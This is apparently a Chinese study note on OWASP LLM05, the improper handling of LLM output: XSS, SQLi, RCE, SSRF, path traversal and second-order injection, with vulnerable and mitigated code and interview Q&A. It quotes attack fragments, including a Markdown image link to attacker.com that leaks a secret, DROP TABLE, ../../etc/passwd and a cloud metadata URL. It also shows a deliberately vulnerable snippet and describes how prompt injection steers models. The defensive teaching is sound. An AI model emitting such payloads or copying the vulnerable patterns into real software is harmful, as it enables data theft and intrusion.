[[08 不安全输出处理|不安全输出]](Improper Output Handling,OWASP **LLM05**)的核心错误只有一句:**把 LLM 的输出当成「可信内容」直接喂给下游系统**。一旦下游(浏览器、数据库、shell、文件系统、HTTP 客户端)无条件信任这段输出,LLM 就变成了攻击者注入恶意载荷的「跳板」——经典的 Web 漏洞(XSS、SQLi、RCE、SSRF、路径穿越)全都借这个口子复活。

它和 [[05 Prompt Injection 提示注入|提示注入]] 是一前一后的关系:注入是**输入端**让模型产出恶意内容,不安全输出是**输出端**让这恶意内容真正落地造成危害。两者串起来就是一条完整的利用链。

## 把 LLM 输出当可信 → 五类经典漏洞

![[sec-不安全输出二阶注入.png]]

只要 LLM 输出未经消毒就进了下游的「执行/渲染/拼接」环节,传统漏洞就被搬了过来:

- **XSS**:把模型输出的 Markdown / HTML **直接渲染**到页面。输出里若含 `<script>` 或 `onerror=` 等,就在用户浏览器里执行。LLM 聊天界面渲染富文本是重灾区。
- **SQL 注入**:把模型输出**拼进 SQL 语句**(比如让 LLM 生成查询条件再字符串拼接)。输出里的 `'; DROP TABLE…` 就执行了。
- **RCE(远程代码执行)**:对 LLM **生成的代码 `eval`/`exec`**。Code interpreter、自动化脚本场景下,模型被诱导产出恶意代码就直接在你的环境里跑。
- **SSRF**:拿模型输出里的 **URL 直接发请求**。攻击者诱导模型产出指向内网/元数据服务(`169.254.169.254`)的 URL,服务器替他访问。
- **路径穿越**:把模型输出**当文件路径**读写。输出里的 `../../etc/passwd` 就越权访问了文件系统。

**出口覆盖率手算(为什么是「木桶短板」而非「平均分」)**。下游消毒是**逐出口独立**的:HTML 转义防不了 SQLi,参数化防不了 XSS——每个出口要单独做对。设系统有 $n=6$ 个出口(HTML/SQL/shell/文件/URL/落库),每个被正确编码的概率(覆盖率)$p$,各出口独立,则**全系统不被打穿**的概率是 $p^{n}$。代入:即使单出口覆盖率高达 $p=0.95$(每个出口 95% 做对),$p^{6}=0.95^{6}\approx0.735$——**整体仍有约 26.5% 的概率存在可打穿的出口**;把覆盖率提到 $p=0.99$,$0.99^{6}\approx0.941$,仍漏 ~5.9%。反过来算:要让全系统打穿率压到 1% 以下($p^{6}\ge0.99$),单出口覆盖率必须 $p\ge0.99^{1/6}\approx0.9983$,即**每个出口都得做到 99.83% 才行**。这就是「全出口编码是 all-or-nothing」的数学含义——安全由**最差的那个出口**决定(木桶短板),攻击者只需找到 $n$ 个里漏的那一个;盲目堆「平均覆盖率」没用,必须每个出口都接近满分。

## 二阶注入(stored / second-order)

最隐蔽的一类:恶意载荷**不在当场发作,而是先「落库」,等后续流程读回时才触发**。

链路是:LLM 输出(携带载荷)→ 存进数据库/知识库/日志 → 之后被**另一个流程**读回 → 当作上下文 / 渲染 / 执行 → 此时触发。它危险在于:写入那一刻看起来无害,常规的「输入校验」也防不住(因为载荷是从内部数据来的);而且它和 [[11 向量与嵌入弱点与 RAG 投毒|RAG 投毒]]、间接 [[05 Prompt Injection 提示注入|提示注入]] 会合流——存进知识库的恶意输出,下次检索回来就是一次间接注入。

**类比**:像有人往公司 Wiki 里埋了一句话——写的当下没人觉得有问题(过了「入口」),三个月后一个新人按流程查 Wiki、照着那句话操作就中招了。坏事发生在「读回」而不是「写入」那一刻,所以守在写入口的门卫(输入校验)根本不会拦它——这正是要「入库时也消毒」的原因。

## 脆弱代码 vs 缓解代码

```python
# ❌ 脆弱:LLM 输出被当可信,直接进下游执行/渲染/拼接
answer = llm.generate(user_question)

render_html(answer)                          # XSS:Markdown/HTML 直接渲染
db.execute(f"SELECT * FROM t WHERE x='{answer}'")   # SQLi:字符串拼 SQL
eval(llm.generate("写段计算代码"))            # RCE:eval 模型生成的代码
requests.get(answer_url)                     # SSRF:直接请求输出里的 URL
open(answer_path).read()                     # 路径穿越:输出当文件路径
kb.save(answer)                              # 二阶:载荷落库,后续读回才发作
```

```python
# ✅ 缓解:把 LLM 输出当「不可信用户输入」,按下游场景消毒/编码
answer = llm.generate(user_question)

render_html(html_escape(markdown_safe(answer)))      # XSS:转义 + 白名单渲染
db.execute("SELECT * FROM t WHERE x = ?", (answer,)) # SQLi:参数化查询,数据不进语句

# RCE:绝不 eval LLM 代码;要跑就进沙箱 + 最小权限 + 超时
result = sandbox.run(llm.generate("写段计算代码"),
                     network=False, timeout=5, mem_limit="128m")

# SSRF:URL 白名单 + 禁内网/元数据地址
url = answer_url
if not allowed_host(urlparse(url).hostname):
    raise SecurityError("URL 不在白名单")
requests.get(url)

# 路径穿越:规范化后限定在允许目录内
path = safe_join(BASE_DIR, answer_path)              # 解析 .. 后校验前缀
open(path).read()

kb.save(sanitize(answer))                            # 入库前也消毒,堵二阶注入
```

## 防御

- **默认不信任**:把每一段 LLM 输出当**不可信的用户输入**对待——这是总纲,其余手段都从这条派生。
- **按目标场景编码 / 转义**(而非笼统「清洗」):送进 HTML 就做 HTML 转义,送进 SQL 就用**参数化查询**(让数据永不进语句),送进 shell 就用参数数组而非拼字符串,送进文件系统就**规范化路径 + 限定根目录**。
- **绝不 `eval` LLM 生成的代码**;确需执行就进**沙箱**(无网络、最小权限、超时、内存限制)——见 [[24 沙箱、最小权限与人审闸门|沙箱]]。
- **URL / 路径白名单**:外发请求只允许已知主机,禁内网与云元数据端点(防 SSRF);文件路径解析 `..` 后校验前缀(防穿越)。
- **入库前也消毒**:不只在「输出时」消毒,**写入持久层时同样消毒**,否则二阶注入会绕过出口检查。
- **最小权限下游**:执行 LLM 动作的服务账号权限收到最小,即使被利用,爆炸半径也有限,呼应 [[14 Excessive Agency 与 Goal Hijack|Excessive Agency]] 与 [[21 Guardrails 与输入输出防护|Guardrails]]。

## 对比表

| 下游场景 | 错误做法 | 漏洞 | 正确消毒 |
|---|---|---|---|
| 网页渲染 | 直接渲染 Markdown/HTML | XSS | HTML 转义 + 白名单渲染 |
| 数据库 | 字符串拼 SQL | SQLi | 参数化查询 |
| 代码执行 | eval/exec 模型代码 | RCE | 沙箱 + 最小权限,绝不 eval |
| 外发请求 | 直接请求输出 URL | SSRF | URL 白名单 + 禁内网 |
| 文件读写 | 输出当路径 | 路径穿越 | 规范化路径 + 限定根目录 |
| 落库后读回 | 入库不消毒 | 二阶注入 | 写入时同样消毒 |

## 工业界实践

工业界把「LLM 输出 = 不可信用户输入」当成铁律,落到**下游每个出口按场景消毒** + **架构上隔离爆炸半径**。

**真实案例:**

- **Markdown 图片外泄(最经典)**:模型输出 `![](https://attacker.com/?d=<密钥>)`,前端渲染即外发数据——这是「不安全输出渲染」与 [[07 敏感信息泄露与 System Prompt 泄露|信息泄露]] 的合流。修复:图片代理 + CSP 限制外发域 + 渲染前剔除可疑 URL。
- **LLM 生成 SQL / 代码被直接执行**:Text-to-SQL、code interpreter 场景,模型被诱导产出 `DROP TABLE` 或读 `/etc/passwd` 的代码,下游无脑执行即 RCE/SQLi。
- **SSRF 打云元数据**:让模型产出指向 `169.254.169.254`(AWS/GCP 元数据端点)的 URL,服务器替攻击者拉取临时凭证。

**主流防护工具 / 能力:**

- **LlamaFirewall 的 CodeShield(Meta)**:静态分析 LLM 生成代码,拦不安全模式(命令注入、硬编码密钥、危险 API),专治 code agent 出口。
- **传统 AppSec 武器搬过来**:输出 HTML 走 **DOMPurify**(白名单净化)、SQL 走**参数化查询/ORM**、shell 走参数数组、URL 走 **SSRF 防护库**(禁私网段 + DNS rebinding 防护)、文件路径走规范化 + 根目录限定。
- **沙箱执行**:gVisor / Firecracker / 容器(无网络、只读 FS、最小权限、超时、内存限制)跑 LLM 生成代码,见 [[24 沙箱、最小权限与人审闸门|沙箱]]。

**纵深防御架构(出口分场景):** 不存在「一个 sanitize() 通吃」——**送进哪个下游就按那个下游的语法编码**。HTML 转义防不了 SQLi,SQL 参数化防不了 XSS。正确做法是在**每个出口边界**做对应编码,并在**入库时也消毒**(否则二阶注入绕过出口检查)。

**误报 / 延迟权衡:** 过度净化会破坏正常 Markdown/代码块的可用性(把合法 `<table>` 也删了)。折中:**用白名单净化器(DOMPurify)而非黑名单**,只在真正进入危险下游(eval、shell、SQL 拼接)处强制沙箱/参数化。

**最佳实践:二阶注入伪代码片段:**

```python
# 二阶注入链:写入与读回都要消毒
def store_answer(answer, kb):
    kb.save(sanitize_for_storage(answer))   # ① 入库时消毒(剥离指令性/可执行片段)

def use_retrieved(doc, llm):
    # ② 读回时把检索内容当不可信数据,加分隔 + 标注来源,不与系统指令同级
    ctx = wrap_untrusted(doc)               # 例:<<UNTRUSTED_DATA>>...<<END>>
    reply = llm.chat(SYSTEM, user_q, context=ctx)
    return sanitize_output(reply)           # ③ 出口再消毒,按渲染场景编码
```

## 面试高频

**攻击原理 + 缓解 + 为何不彻底:** 根因是「把 LLM 输出当可信内容直接喂下游」,使 LLM 成注入跳板,复活 XSS/SQLi/RCE/SSRF/路径穿越。缓解靠**按目标场景编码 + 沙箱 + 白名单 + 入库消毒**。**不彻底**:模型输出空间无限,攻击 payload 可无穷变体;只要某个下游出口漏了一处编码,就被打穿;二阶注入还能绕过出口检查。

- **Q:不安全输出处理和提示注入什么关系?**
  A:一前一后构成完整利用链——**注入在输入端**让模型产出恶意内容,**不安全输出在输出端**让这恶意内容真正落地造危害。注入是因,不安全输出是果;只防一端不够。

- **Q:LLM 输出要不要做输入校验?**
  A:要,而且要把它当**不可信用户输入**对待。但关键不是笼统「校验/清洗」,而是**按目标下游场景编码**:进 HTML 就 HTML 转义,进 SQL 就参数化(数据永不进语句),进 shell 就参数数组,进文件系统就路径规范化 + 根目录限定。
  *陷阱:* 「我做了输入消毒所以输出安全」是错的——输入消毒防不了二阶注入(载荷从内部库读回)和模型自身产出的恶意内容。

- **Q:能不能 eval 模型生成的代码?**
  A:**绝不**。要执行就进沙箱(无网络、最小权限、超时、内存限制)。`eval`/`exec` 模型输出 = 把控制权交给攻击者。

- **Q:什么是二阶注入,为什么常规输入校验防不住?**
  A:恶意载荷**先落库**(看似无害),**后续被另一个流程读回**时才触发。常规输入校验只看「当场输入」,而载荷是从**内部数据**来的,绕过出口检查;还会与 [[11 向量与嵌入弱点与 RAG 投毒|RAG 投毒]]、间接注入合流。缓解:**入库时也消毒** + 读回时把检索内容当不可信数据隔离。
  *追问:为什么叫「二阶」?* 类比二阶 SQL 注入——payload 不在第一次请求生效,而在被存储后第二次读取时生效。

- **Q:LLM 应用里 SSRF 怎么发生?怎么防?**
  A:模型输出含 URL,服务器直接拿去发请求(取网页、调 webhook)。攻击者诱导产出指向内网/云元数据(`169.254.169.254`)的 URL → 服务器替他访问、外带临时凭证。防:**URL 主机白名单 + 禁私网段 + 防 DNS rebinding**。

- **OWASP LLM Top 10(2025)**:本篇对应 **LLM05 Improper Output Handling**;与 **LLM01 Prompt Injection** 构成利用链。OWASP 强调「downstream 系统对 LLM 输出零信任」。
- **MITRE ATLAS**:对应 **Execution**(执行)与 **LLM-enabled** 利用链;LLM 输出落地执行属典型 Execution 技术。
- **关联 CWE**:XSS=CWE-79、SQLi=CWE-89、命令注入=CWE-78、SSRF=CWE-918、路径穿越=CWE-22、不安全反序列化=CWE-502。LLM 只是把这些经典 CWE 的「不可信源」从用户换成模型输出。
- **关键资料**:Simon Willison 长期跟踪 LLM 输出导致的 exfiltration/XSS 系列;Embrace The Red(wunderwuzzi)博客披露多起 ChatGPT/Copilot Markdown 外泄与工具滥用 PoC。
- **对抗演化**:出口加 HTML 转义 → 攻击转 SQL/SSRF/路径其他出口 → 全出口编码 → 攻击转二阶注入绕出口 → 入库也消毒 + 检索内容隔离。每堵一个口,攻击转移到下一个未设防的下游。

## 关键事实

- 不安全输出处理 = OWASP **LLM05**;根因 = **把 LLM 输出当可信内容直接喂给下游**,使 LLM 成为注入恶意载荷的跳板。
- 下游被信任 → 复活五类经典漏洞:**XSS / SQLi / RCE(eval) / SSRF / 路径穿越**。
- **二阶注入**:载荷先落库,后续被读回时才触发;常规输入校验防不住,且会与 [[11 向量与嵌入弱点与 RAG 投毒|RAG 投毒]]、间接 [[05 Prompt Injection 提示注入|提示注入]] 合流。
- 总纲:把 LLM 输出当**不可信用户输入**;按**目标场景编码/转义**(HTML 转义、参数化查询、路径规范化),**绝不 eval** 模型代码(要跑进 [[24 沙箱、最小权限与人审闸门|沙箱]]),URL/路径白名单,**入库前也消毒**。
- 与 [[05 Prompt Injection 提示注入|提示注入]] 构成完整利用链:注入在输入端造恶意输出,本条在输出端让其落地。
